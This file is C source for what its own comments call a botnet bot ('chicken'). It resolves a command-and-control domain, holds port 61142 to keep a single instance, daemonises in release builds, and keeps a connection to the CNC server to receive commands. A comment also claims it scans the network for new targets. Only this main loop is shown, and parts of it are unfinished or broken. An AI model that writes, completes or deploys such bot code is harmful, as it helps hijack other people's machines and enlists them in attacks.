#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <string.h>


#include "includes.h"
#include "reslove.h"

/*botnet bin running chicken
 *occupation 61142 port to mark running status
 *auto scan the network to find the next target can be attacked
 *keep the connection with the CNC server
 */

static void ensure_single_instance(void);
static void establish_connection(void);
static void close_connection_CNC(void);
static void close_connection_local(void);

struct sockaddr_in srv_addr;
static int fd_ctrl = -1, fd_serv = -1;
static BOOL need_setup_connection = FALSE;
static BOOL bind_OK = FALSE;


int main(int argc, char **args)
{
	int pgroupid;
	int select_count = 0;

	srv_addr.sin_family = AF_INET;
	reslove_dns_lookup(CNC_DOMAIN, &srv_addr.sin_addr.s_addr);
	if (srv_addr.sin_addr.s_addr == 0)
	{
		printf("[main]Failed to reslove CNC_DOMAIN to address\n");	
		return -1;
	}
	else
	{
		printf("[main]CNC address:%s\n", inet_ntoa(srv_addr.sin_addr));	
	}
	srv_addr.sin_port = htons(CNC_PORT);	

	
	while(!bind_OK)
	{
		ensure_single_instance();
		sleep(3);
	}

	/*
	while(!need_setup_connection)
	{
		establish_connection();
		sleep(3);	
	}
	*/

#ifdef RELEASE
	become a deamon
	if (fork() > 0)
	{
		return 1;	
	}
	pgroupid = setsid();
	close(STDIN);
	close(STDOUT);
	close(STDERR);
#endif
	
	/*initialization module here
	 *
	 *
	 *
	 */

	while(TRUE)
	{
		fd_set fdread, fdwrite;
		struct timeval timeline;
		int mfd, nfds;

		//initilation fd_set
		FD_ZERO(&fdread);
		FD_ZERO(&fdwrite);

		//select fd_ctrl when data in;
		FD_SET(fd_ctrl, &fdread);

		if (fd_serv == -1)
		{
			establish_connection();
		}
		
		/* in the first select, we assume that the connection has not been established
		 * so we add fd_serv to fdwrite
		 */
		if (need_setup_connection)
		{
			FD_SET(fd_serv, &fdwrite);	
		}
		/* after the connection is established, we only need to read the data*/
		else
		{
			FD_SET(fd_serv, &fdread);	
		}
		
		//get max fd for selection parmater
		if (fd_ctrl > fd_serv)
		{
			mfd = fd_ctrl;	
		}
		else
		{
			mfd = fd_serv;	
		}

		//timeout 10s
		timeline.tv_usec = 0;
		timeline.tv_sec = 10;

		//We do NOT care exception set
		nfds = select(mfd+1, &fdread, &fdwrite, NULL, &timeline);

		if (nfds == -1)
		{
			printf("[main]Select failed errno:%d\n", errno);	
			continue;
		}
		else if (nfds == 0)
		{
			//try to keep alive
			int flag = 1;
			if ( select_count++ % 10 == 0)
			{
				send(fd_serv, &flag, sizeof(flag), MSG_NOSIGNAL);	
			}
			continue;
		}
		/* when fd_ctrl receives a new client's connection request, it kill itself
		 * becaseus: in ensure_signal_instance(), when I failed to  bind the local address, I will try to connect to it 
		 */ 	
		if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdread))
		{
			//kill itself here
			struct sockaddr_in new_addr;
			socklen_t new_addr_len = sizeof(struct sockaddr_in);
			accept(fd_ctrl, (struct sockaddr*)&new_addr, &new_addr_len);

			close_connection_CNC();
			close_connection_local();

			printf("[main]A new instance appear, try to kill myselfi\n");

			//exit
			kill(getpid(), SIGKILL); exit(0);
		}

		//check if the connection is established successfully
		if (need_setup_connection)
		{
			//in the second select, fd_serv will be added into fdread;
			need_setup_connection = FALSE;

			//connection failed
			if (fd_serv != -1 && !FD_ISSET(fd_serv, &fdwrite))
			{
				close_connection_CNC();
			}
			else
			{
				//Detect if there is an error
				int err = 0;
				socklen_t err_len = sizeof(err);
				getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
				if (err != 0)
				{
					close_connection_CNC();	
				}
				else
				{
					int buf[BUFSIZ];
					memcpy(buf, "hello,world", 12);
					//send login information
					printf("[main]send login information here\n");						
					write(fd_serv, buf, sizeof(buf));
					printf("[main]Connection CNC success\n");						
				}
			}
		}
		//if the connection is already established, accept the server command
		else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdread))
		{
			/* try to read data from fd_serv
			 * readn > 0	//Normal connection
			 * readn == 0	//connection closed
			 * readn < 0	//An error occurred
			 */
			printf("[main]Receive command here\n");
			char readbuf[BUFSIZ];
			read(fd_serv, readbuf, sizeof(readbuf));
			printf("[main]Data: %s\n", readbuf);
		}
	}
	
	return 0;
}



static void establish_connection()
{
	printf("[main]Start to connect to CNC\n");	
	fd_serv = socket(AF_INET, SOCK_STREAM, 0);
	if (fd_serv == -1)
	{
		need_setup_connection = FALSE;
		printf("create socket failed, errorno:%d\n", errno);	
		return ;
	}

	need_setup_connection = TRUE;
	fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
	connect(fd_serv, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in));

/* When a socket set as a unblock status
 * connection() will always return -1 and set errno = 115
 * so if we check the connection status via ret value, we would always failed;
	MAKESURE_CONNECTION:
		if (ret == -1)
		{
			need_setup_connection = FALSE;	
			close(fd_serv);
			printf("[main]Failed to connect to CNC. errno:%d\n", errno);
		}
		else
		{
			need_setup_connection = TRUE;	
			printf("[main]Connect to CNC success.\n");
		}
 */
	return ;
}

static void ensure_single_instance(void)
{
	//just a struct
	struct sockaddr_in addr;
	struct sockaddr_in addrclient;
	int opt = 1;
	int ret;
	socklen_t socklength = sizeof(addrclient);
	
	fd_ctrl = socket(AF_INET, SOCK_STREAM, 0);
	if (fd_ctrl == -1)
	{
		bind_OK = FALSE;
		return ;	
	}

	setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	fcntl(fd_ctrl, F_SETFL, O_NONBLOCK|fcntl(fd_ctrl, F_GETFL, 0));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = LOCAL_ADDR;
	addr.sin_port = htons(SINGLE_INSTANCE_PORT);

	errno = 0;
	ret = bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	//bind failed, so try to connect to it
	if (ret == -1)
	{
		bind_OK = FALSE;	

		if (errno == EADDRNOTAVAIL)
		{
			printf("[main] Another instance is already running (errno = %d), try to send kill request.\n", errno);	
			//restore the struct
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = INADDR_ANY;
			addr.sin_port = htons(SINGLE_INSTANCE_PORT);

			ret = connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
			if (ret == -1)
			{
				printf("[main] Failed to connect to fd_ctrl, try to kill itself\n");			
			}

			printf("[main]Another instance will be close after a short time\n");
			sleep(1);
			close(fd_ctrl);
		}
	}
	else
	{
		ret = listen(fd_ctrl, 1);
		if (ret  == -1)
		{
			bind_OK = FALSE;
			printf("[main]Failed to listen on fd_ctrl, I will be try again!\n");	
			close(fd_ctrl);
			sleep(1);
		}
		else
		{
			printf("[main]There are only one instance running on this machine port:%d\n", ntohs(addr.sin_port));
			bind_OK = TRUE;
		}
	}

	return ;

}

static void close_connection_CNC(void)
{
	if (fd_serv != -1)
	{
		close(fd_serv);
	}
	fd_serv = -1;
}

static void close_connection_local(void)
{
	if (fd_ctrl != -1)
	{
		close(fd_ctrl);
	}
	fd_ctrl = -1;
}
